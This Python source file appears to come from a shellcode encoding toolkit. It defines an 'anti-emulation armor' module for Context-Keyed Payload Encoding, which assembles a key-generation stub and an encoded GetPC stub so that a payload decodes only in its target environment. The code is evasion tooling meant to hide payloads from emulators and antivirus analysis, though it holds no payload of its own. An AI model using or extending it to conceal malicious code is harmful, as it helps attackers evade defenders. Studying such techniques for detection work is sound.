#!/usr/bin/python

"""
CKPE
Anti-emulation armor using Context-Keyed Payload Encoding
"""

from random import choice
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.keygen import keygen_stub_builder
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, word_keywords, arch_registers
from utils.bytework import bytes_to_asm

class evasion_ckpe_ckpe(evasion_module):

    #
    # Overriden method to fill key registery
    # No returned code here because this is handled by getPCStub as key generation for CKPE has to precede getPC code
    #
	def keyfiller_stub(self, key_reg, key):
		self.key_reg = key_reg
		self.key_val = key
		return ""

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		keygen_builder = keygen_stub_builder(self.arch, self.bits, self.badchars)
		keygen_stub = bytes_to_asm(keygen_builder.ckpe_keygen_stub(self.key_reg, self.additional_params['ckpe_method'], self.additional_params['ckpe_params']))

		getpc_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		encoded_getpc_stub = bytes_to_asm(getpc_builder.encoded_stack_getpc_stub(getpc_reg, self.key_reg, self.key_val))

		variables = {'key_reg': self.key_reg, 'getpc_reg': getpc_reg, 'reg_size': reg_size, 'keygen_stub': keygen_stub, 'encoded_getpc_stub': encoded_getpc_stub}

		listing = '''
main:
	{keygen_stub}
	PUSH {key_reg}

	{encoded_getpc_stub}

	POP {key_reg}
	POP {key_reg}
	SUB {getpc_reg}, (-5 % {reg_size})
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub